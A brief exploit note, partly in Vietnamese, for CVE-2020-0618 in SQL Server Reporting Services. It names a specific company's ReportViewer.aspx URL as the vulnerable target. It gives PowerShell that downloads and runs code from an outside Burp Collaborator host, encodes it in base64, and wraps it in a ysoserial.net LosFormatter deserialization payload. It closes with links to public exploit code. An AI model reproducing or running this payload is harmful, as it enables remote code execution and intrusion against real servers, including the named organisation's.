# CVE-2020-0618
Melissa
https://status.melissa.com/ReportServer_CUSTOMERSQL/Pages/ReportViewer.aspx <- link bị dính lỗ hổng

$command = '(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'

$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)

$encodedCommand = [Convert]::ToBase64String($bytes)

.\ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "powershell.exe -encodedCommand $encodedCommand" -o base64 | clip

# Tham khảo:
 - https://github.com//euphrat1ca//CVE-2020-0618
 - https://www.exploit-db.com/exploits/48816
 - https://github.com/pwntester/ysoserial.net/releases
